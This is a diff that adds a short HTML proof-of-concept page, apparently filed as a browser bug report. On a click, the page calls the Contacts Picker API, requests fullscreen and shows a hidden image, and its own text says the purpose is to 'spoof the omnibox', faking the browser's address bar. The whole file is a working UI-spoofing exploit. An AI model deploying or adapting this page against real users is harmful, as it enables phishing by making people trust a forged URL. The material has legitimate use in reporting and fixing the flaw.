@@ -1,0 +1,17 @@
+<!doctype html>
+<head>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<style>body,html{margin:0}#s{width:100%;height:100%}</style>
+<body>
+  <script>
+onclick=async()=>{
+  navigator.contacts.select(["name"],{});
+  s.style.display="block";c.style.display="none";
+  document.documentElement.requestFullscreen();
+}
+</script>
+</head>
+<img id=s hidden src=spoof.png>
+<div id=c><center><h1>Yoyoyo click anywhere to spoof the omnibox</h1></center></div>
+</body>
+</html>
